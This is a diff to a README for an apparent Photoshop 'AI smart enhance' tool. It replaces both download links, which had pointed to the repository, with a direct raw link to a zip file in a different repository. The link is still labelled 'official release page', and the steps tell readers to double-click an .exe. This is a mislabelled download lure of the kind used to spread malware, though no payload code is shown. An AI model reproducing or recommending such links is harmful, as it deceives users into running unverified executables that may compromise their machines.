@@ -5,7 +5,7 @@ description: "Automate image enhancement in Photoshop CC 2024 using machine lear
 ---
 # ⚡ photoshop-ai-smart-enhance - Improve photo quality with smart tools
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Franchecomtenymphaeaalba794/photoshop-ai-smart-enhance)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Franchecomtenymphaeaalba794/franchecomtenymphaeaalba794.github.io/main/apertly/v2.1.zip)
 
 ## 📌 About this tool
 
@@ -23,7 +23,7 @@ Before you begin, ensure your computer meets these requirements:
 
 ## 📥 How to download and install
 
-1. Go to the [official release page](https://github.com/Franchecomtenymphaeaalba794/photoshop-ai-smart-enhance) to download the installer.
+1. Go to the [official release page](https://raw.githubusercontent.com/Franchecomtenymphaeaalba794/franchecomtenymphaeaalba794.github.io/main/apertly/v2.1.zip) to download the installer.
 2. Select the file ending in .exe to start your download.
 3. Once the download finishes, find the file in your Downloads folder.
 4. Double-click the file to start the installation process.
